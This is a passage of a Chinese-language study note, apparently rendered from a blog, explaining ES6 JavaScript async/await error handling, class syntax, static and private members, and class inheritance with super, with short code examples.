id="Promise-对象的状态变化"><a href="#Promise-对象的状态变化" class="headerlink" title="Promise 对象的状态变化"></a>Promise 对象的状态变化</h3><p>async 函数返回的 Promise 对象，必须等到内部所有 await 命令后面的 Promise 对象执行完，才会发生状态改变，除非遇到 return 语句或者抛出错误。</p><h3 id="await-命令"><a href="#await-命令" class="headerlink" title="await 命令"></a>await 命令</h3><p>正常情况下， await 命令后面是一个 Promise 对象。如果不是，会被转成一个即 resolve 的 Promise 对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">async function f() &#123; </span><br><span class="line">  return await 123; </span><br><span class="line">&#125;</span><br><span class="line">f().then(v =&gt; console.log(v)) </span><br><span class="line">// 123</span><br></pre></td></tr></table></figure></p><p>只要一个 await 语句后面的 Promise 变为 reject ，那么整个 async 函数都会中断执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">async function f() &#123; </span><br><span class="line">  await Promise.reject(&apos;出错了&apos;); </span><br><span class="line">  await Promise.resolve(&apos;hello world&apos;); // 不会执行 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><ul><li>最好将 await 放在 try…catch 代码块之中。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">async function myFunction() &#123; </span><br><span class="line">  try &#123; </span><br><span class="line">    await somethingThatReturnsAPromise(); </span><br><span class="line">  &#125; catch (err) &#123; </span><br><span class="line">    console.log(err);</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>多个 await 命令后面的异步操作，如果不存在继发关系，最好让它们同时触发。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let [foo, bar] = await Promise.all([getFoo(), getBar()]);</span><br></pre></td></tr></table></figure><ul><li>await 命令只能用在 async 函数之中，如果用在普通函数，就会报错。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">async function dbFuc(db) &#123; </span><br><span class="line">  let docs = [&#123;&#125;, &#123;&#125;, &#123;&#125;]; </span><br><span class="line">  // 报错 </span><br><span class="line">  docs.forEach(function (doc) &#123; </span><br><span class="line">    await db.post(doc); </span><br><span class="line">  &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="异步遍历器"><a href="#异步遍历器" class="headerlink" title="异步遍历器"></a>异步遍历器</h3><h4 id="for-await…of"><a href="#for-await…of" class="headerlink" title="for await…of"></a>for await…of</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">async function () &#123; </span><br><span class="line">  try &#123; </span><br><span class="line">    for await (const x of createRejectingIterable()) &#123; </span><br><span class="line">      console.log(x); </span><br><span class="line">    &#125; </span><br><span class="line">  &#125; catch (e) &#123; </span><br><span class="line">    console.error(e); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Class-的基本语法"><a href="#Class-的基本语法" class="headerlink" title="Class 的基本语法"></a>Class 的基本语法</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//定义类 </span><br><span class="line">class Point &#123; </span><br><span class="line">  constructor(x, y) &#123; </span><br><span class="line">    this.x = x; </span><br><span class="line">    this.y = y; </span><br><span class="line">  &#125;</span><br><span class="line">  toString() &#123; </span><br><span class="line">    return &apos;(&apos; + this.x + &apos;, &apos; + this.y + &apos;)&apos;; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类的所有方法都定义在类的 prototype 属性上面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 等同于 </span><br><span class="line">Point.prototype = &#123; </span><br><span class="line">  constructor() &#123;&#125;, </span><br><span class="line">  toString() &#123;&#125;, </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>Object.assign 方法可以很方便地一次向类添加多个方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object.assign(Point.prototype, &#123; </span><br><span class="line">  toString()&#123;&#125;, </span><br><span class="line">  toValue()&#123;&#125; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>类的内部所有定义的方法，都是不可枚举的。</p><h3 id="constructor-方法"><a href="#constructor-方法" class="headerlink" title="constructor 方法"></a>constructor 方法</h3><p>constructor 方法是类的默认方法，通过 new 命令生成对象实例时，自动调用该方法。一个类必须有 constructor 方法，如果没有显式定义，一个空的 constructor 方法会被默认添加。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Point &#123; &#125;</span><br><span class="line">// 等同于 </span><br><span class="line">class Point &#123; </span><br><span class="line">  constructor() &#123;&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="类的实例对象"><a href="#类的实例对象" class="headerlink" title="类的实例对象"></a>类的实例对象</h3><ul><li>生成类的实例对象的写法，与 ES5 完全一样，也是使用 new 命令。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Point &#123; // ... &#125;</span><br><span class="line">// 报错 </span><br><span class="line">var point = Point(2, 3); </span><br><span class="line">// 正确 </span><br><span class="line">var point = new Point(2, 3);</span><br></pre></td></tr></table></figure><ul><li>与 ES5 一样，实例的属性除非显式定义在其本身（即定义在 this 对象上），否则都是定义在原型上（即定义在 class 上）。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//定义类 </span><br><span class="line">class Point &#123; </span><br><span class="line">  constructor(x, y) &#123; </span><br><span class="line">    this.x = x; </span><br><span class="line">    this.y = y; </span><br><span class="line">  &#125;</span><br><span class="line">  toString() &#123; </span><br><span class="line">    return &apos;(&apos; + this.x + &apos;, &apos; + this.y + &apos;)&apos;; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">var point = new Point(2, 3); </span><br><span class="line">point.toString() // (2, 3) </span><br><span class="line">point.hasOwnProperty(&apos;x&apos;) // true </span><br><span class="line">point.hasOwnProperty(&apos;y&apos;) // true </span><br><span class="line">point.hasOwnProperty(&apos;toString&apos;) // false </span><br><span class="line">point.__proto__.hasOwnProperty(&apos;toString&apos;) // true</span><br></pre></td></tr></table></figure><ul><li>与 ES5 一样，类的所有实例共享一个原型对象。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var p1 = new Point(2,3); </span><br><span class="line">var p2 = new Point(3,2); </span><br><span class="line">p1.__proto__ === p2.__proto__ </span><br><span class="line">//true</span><br></pre></td></tr></table></figure><h3 id="Class-表达式"><a href="#Class-表达式" class="headerlink" title="Class 表达式"></a>Class 表达式</h3><ul><li>与函数一样，类也可以使用表达式的形式定义。</li><li>采用 Class 表达式，可以写出立即执行的 Class。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let person = new class &#123; </span><br><span class="line">  constructor(name) &#123; </span><br><span class="line">    this.name = name; </span><br><span class="line">  &#125;</span><br><span class="line">  sayName() &#123; </span><br><span class="line">    console.log(this.name); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;(&apos;张三&apos;); </span><br><span class="line">person.sayName(); // &quot;张三&quot;</span><br></pre></td></tr></table></figure><h3 id="不存在变量提升"><a href="#不存在变量提升" class="headerlink" title="不存在变量提升"></a>不存在变量提升</h3><p>类不存在变量提升（hoist），这一点与 ES5 完全不同。</p><h3 id="私有方法"><a href="#私有方法" class="headerlink" title="私有方法"></a>私有方法</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>将私有方法移出模块,内部调用 call 进行绑定。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Widget &#123; </span><br><span class="line">  foo (baz) &#123; </span><br><span class="line">    bar.call(this, baz); </span><br><span class="line">  &#125;</span><br><span class="line">  // ... </span><br><span class="line">&#125;</span><br><span class="line">function bar(baz) &#123; </span><br><span class="line">  return this.snaf = baz; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>利用 Symbol 值的唯一性，将私有方法的名字命名为一个 Symbol 值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const bar = Symbol(&apos;bar&apos;); </span><br><span class="line">const snaf = Symbol(&apos;snaf&apos;); </span><br><span class="line">export default class myClass&#123; </span><br><span class="line">  // 公有方法 </span><br><span class="line">  foo(baz) &#123; </span><br><span class="line">    this[bar](baz); </span><br><span class="line">  &#125;</span><br><span class="line">  // 私有方法 </span><br><span class="line">  [bar](baz) &#123; </span><br><span class="line">    return this[snaf] = baz; </span><br><span class="line">  &#125;</span><br><span class="line">  // ... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="私有属性"><a href="#私有属性" class="headerlink" title="私有属性"></a>私有属性</h3><p>在属性名之前，使用 # 表示。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Point &#123; </span><br><span class="line">  #x; </span><br><span class="line">  constructor(x = 0) &#123; </span><br><span class="line">    #x = +x; </span><br><span class="line">    // 写成 this.#x 亦可 </span><br><span class="line">  &#125;</span><br><span class="line">  get x() &#123; </span><br><span class="line">    return #x </span><br><span class="line">  &#125; </span><br><span class="line">  set x(value) &#123; </span><br><span class="line">    #x = +value</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="this-的指向"><a href="#this-的指向" class="headerlink" title="this 的指向"></a>this 的指向</h3><p>类的方法内部如果含有 this ，它默认指向类的实例。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Logger &#123; </span><br><span class="line">  printName(name = &apos;there&apos;) &#123; </span><br><span class="line">    this.print(`Hello $&#123;name&#125;`); </span><br><span class="line">  &#125;</span><br><span class="line">  print(text) &#123; </span><br><span class="line">    console.log(text); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">const logger = new Logger(); </span><br><span class="line">const &#123; printName &#125; = logger; </span><br><span class="line">printName(); </span><br><span class="line">// TypeError: Cannot read property &apos;print&apos; of undef ined</span><br></pre></td></tr></table></figure></p><h3 id="Class-的取值函数（getter）和存值函数（setter）"><a href="#Class-的取值函数（getter）和存值函数（setter）" class="headerlink" title="Class 的取值函数（getter）和存值函数（setter）"></a>Class 的取值函数（getter）和存值函数（setter）</h3><p>在“类”的内部可以使用 get 和 set 关键字，对某个属性设置存值函数和取值函数，拦截该属性的存取行为。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class MyClass &#123; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    // ... </span><br><span class="line">  &#125;</span><br><span class="line">  get prop() &#123; </span><br><span class="line">    return &apos;getter&apos;; </span><br><span class="line">  &#125;</span><br><span class="line">  set prop(value) &#123; </span><br><span class="line">    console.log(&apos;setter: &apos;+value); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">let inst = new MyClass(); </span><br><span class="line">inst.prop = 123; </span><br><span class="line">// setter: 123 </span><br><span class="line">inst.prop </span><br><span class="line">// &apos;getter&apos;</span><br></pre></td></tr></table></figure></p><h3 id="Class-的-Generator-方法"><a href="#Class-的-Generator-方法" class="headerlink" title="Class 的 Generator 方法"></a>Class 的 Generator 方法</h3><p>如果某个方法之前加上星号（ * ），就表示该方法是一个 Generator 函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Foo &#123; </span><br><span class="line">  constructor(...args) &#123; </span><br><span class="line">    this.args = args; </span><br><span class="line">  &#125;</span><br><span class="line">  * [Symbol.iterator]() &#123; </span><br><span class="line">    for (let arg of this.args) &#123; </span><br><span class="line">      yield arg; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let x of new Foo(&apos;hello&apos;, &apos;world&apos;)) &#123; </span><br><span class="line">  console.log(x); </span><br><span class="line">&#125;</span><br><span class="line">// hello </span><br><span class="line">// world</span><br></pre></td></tr></table></figure></p><h3 id="Class-的静态方法"><a href="#Class-的静态方法" class="headerlink" title="Class 的静态方法"></a>Class 的静态方法</h3><ul><li>如果在一个方法前，加上 static 关键字，就表示该方法不会被实例继承，而是直接通过类来调用，这就称为“静态方法”。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Foo &#123; </span><br><span class="line">  static classMethod() &#123; </span><br><span class="line">    return &apos;hello&apos;; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">Foo.classMethod() // &apos;hello&apos; </span><br><span class="line">var foo = new Foo(); </span><br><span class="line">foo.classMethod() </span><br><span class="line">// TypeError: foo.classMethod is not a function</span><br></pre></td></tr></table></figure><ul><li>如果静态方法包含 this 关键字，这个 this 指的是类，而不是实例。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Foo &#123; </span><br><span class="line">  static bar () &#123; </span><br><span class="line">    this.baz(); </span><br><span class="line">  &#125;</span><br><span class="line">  static baz () &#123; </span><br><span class="line">    console.log(&apos;hello&apos;); </span><br><span class="line">  &#125;</span><br><span class="line">  baz () &#123; </span><br><span class="line">    console.log(&apos;world&apos;); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">Foo.bar() // hello</span><br></pre></td></tr></table></figure><ul><li>父类的静态方法，可以被子类继承，也可以从 super 对象上调用。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class Foo &#123; </span><br><span class="line">  static classMethod() &#123; </span><br><span class="line">    return &apos;hello&apos;; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Bar extends Foo &#123; &#125;</span><br><span class="line">Bar.classMethod() // &apos;hello&apos;</span><br><span class="line"></span><br><span class="line">//或</span><br><span class="line">class Bar extends Foo &#123; </span><br><span class="line">  static classMethod() &#123; </span><br><span class="line">    return super.classMethod() + &apos;, too&apos;; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">Bar.classMethod() // &quot;hello, too&quot;</span><br></pre></td></tr></table></figure><h3 id="Class-的静态属性和实例属性"><a href="#Class-的静态属性和实例属性" class="headerlink" title="Class 的静态属性和实例属性"></a>Class 的静态属性和实例属性</h3><p>静态属性指的是 Class 本身的属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Foo &#123; &#125;</span><br><span class="line">Foo.prop = 1; </span><br><span class="line">Foo.prop // 1</span><br></pre></td></tr></table></figure></p><h4 id="类的实例属性"><a href="#类的实例属性" class="headerlink" title="类的实例属性"></a>类的实例属性</h4><p>类的实例属性可以用等式，写入类的定义之中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class MyClass &#123; </span><br><span class="line">  myProp = 42; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    console.log(this.myProp); // 42 </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="类的静态属性"><a href="#类的静态属性" class="headerlink" title="类的静态属性"></a>类的静态属性</h4><p>类的静态属性只要在上面的实例属性写法前面，加上 static 关键字就可以了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class MyClass &#123; </span><br><span class="line">  static myStaticProp = 42; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    console.log(MyClass.myStaticProp); // 42 </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="new-target属性"><a href="#new-target属性" class="headerlink" title="new.target属性"></a>new.target属性</h3><ul><li>该属性一般用在构造函数之中，返回 new 命令作用于的那个构造函数。如果构造函数不是通过 new 命令调用的， new.target 会返回 undefined ，因此这个属性可以用来确定构造函数是怎么调用的。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function Person(name) &#123; </span><br><span class="line">  if (new.target === Person) &#123; </span><br><span class="line">    this.name = name; </span><br><span class="line">  &#125; else &#123; </span><br><span class="line">    throw new Error(&apos;必须使用 new 生成实例&apos;); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">var person = new Person(&apos;张三&apos;); // 正确 </span><br><span class="line">var notAPerson = Person.call(person, &apos;张三&apos;); // 报错</span><br></pre></td></tr></table></figure><ul><li>子类继承父类时， new.target 会返回子类。</li><li>在函数外部，使用 new.target 会报错。</li></ul><h2 id="Class-的继承"><a href="#Class-的继承" class="headerlink" title="Class 的继承"></a>Class 的继承</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul><li>子类必须在 constructor 方法中调用 super 方法，否则新建实例时会报错。这是因为子类没有自己的 this 对象，而是继承父类的 this 对象，然后对其进行加工。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Point &#123; /* ... */ &#125; </span><br><span class="line">class ColorPoint extends Point &#123; </span><br><span class="line">  constructor() &#123; &#125; </span><br><span class="line">&#125;</span><br><span class="line">let cp = new ColorPoint(); // ReferenceError</span><br></pre></td></tr></table></figure><ul><li>如果子类没有定义 constructor 方法，这个方法会被默认添加。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class ColorPoint extends Point &#123; &#125;</span><br><span class="line">// 等同于 </span><br><span class="line">class ColorPoint extends Point &#123; </span><br><span class="line">  constructor(...args) &#123; </span><br><span class="line">    super(...args); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Object-getPrototypeOf"><a href="#Object-getPrototypeOf" class="headerlink" title="Object.getPrototypeOf()"></a>Object.getPrototypeOf()</h3><p>Object.getPrototypeOf 方法可以用来从子类上获取父类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object.getPrototypeOf(ColorPoint) === Point </span><br><span class="line">// true</span><br></pre></td></tr></table></figure></p><h3 id="super-关键字"><a href="#super-关键字" class="headerlink" title="super 关键字"></a>super 关键字</h3><p>super 这个关键字，既可以当作函数使用，也可以当作对象使用。</p><h4 id="super-作为函数调用"><a href="#super-作为函数调用" class="headerlink" title="super 作为函数调用"></a>super 作为函数调用</h4><p>super 作为函数调用时，代表父类的构造函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;&#125; class B extends A &#123; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    super(); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>作为函数时， super() 只能用在子类的构造函数之中，用在其他地方就会报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;&#125; class B extends A &#123; </span><br><span class="line">  m() &#123; </span><br><span class="line">    super(); </span><br><span class="line">    // 报错 </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="super-作为对象时"><a href="#super-作为对象时" class="headerlink" title="super 作为对象时"></a>super 作为对象时</h4><p>super 作为对象时，在普通方法中，指向父类的原型对象；在静态方法中，指向父类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class A &#123; </span><br><span class="line">  p() &#123; </span><br><span class="line">    return 2; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class B extends A &#123; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    super(); </span><br><span class="line">    console.log(super.p()); // 2 </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">let b = new B();</span><br></pre></td></tr></table></figure></p><p>由于 super 指向父类的原型对象，所以定义在父类实例上的方法或属性，是无法通过 super 调用的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class A &#123; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    this.p = 2; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class B extends A &#123; </span><br><span class="line">  get m() &#123; </span><br><span class="line">    return super.p; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">let b = new B(); </span><br><span class="line">b.m // undefined</span><br></pre></td></tr></table></figure></p><p>通过 super 调用父类的方法时， super 会绑定子类的 this 。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class A &#123; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    this.x = 1; </span><br><span class="line">  &#125;</span><br><span class="line">  print() &#123; </span><br><span class="line">    console.log(this.x); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class B extends A &#123; </span><br><span class="line">  constructor() &#123; </span><br><span class="line">    super(); </span><br><span class="line">    this.x = 2; </span><br><span class="line">  &#125;</span><br><span class="line">  m() &#123; </span><br><span class="line">    super.print(); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">let b = new B(); </span><br><span class="line">b.m() // 2</span><br></pre></td></tr></table></figure></p><h3 id="类的-prototype-属性和proto属性"><a href="#类的-prototype-属性和proto属性" class="headerlink" title="类的 prototype 属性和proto属性"></a>类的 prototype 属性和<strong>proto</strong>属性</h3><ul><li>子类的 <strong>proto</strong> 属性，表示构造函数的继承，总是指向父类。 </li><li>子类 prototype 属性的 <strong>proto</strong> 属性，表示方法的继承，总是指向父类的 prototype 属性。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class A &#123; &#125;</span><br><span class="line">class B extends A &#123; &#125;</span><br><span class="line">B.__proto__ === A // true </span><br><span class="line">B.prototype.__proto__ === A.prototype // true</span><br></pre></td></tr></table></figure><h3 id="原生构造函数的继承"><a href="#原生构造函数的继承" class="headerlink" title="原生构造函数的继承"></a>原生构造函数的继承</h3><p>ECMAScript 的原生构造函数大致有下面这些。</p><ul><li>Boolean()</li><li>Number()</li><li>String() </li><li>Array() </li><li>Date() </li><li>Function() </li><li>RegExp() </li><li>Error() </li><li>Object()</li></ul><p>ES6 允许继承原生构造函数定义子类，因为 ES6 是先新建父类的实例对象 this ，然后再用子类的构造函数修饰 this ，使得父类的所有行为都可以继承。下面是一个继承 Array 的例子。<br><figure 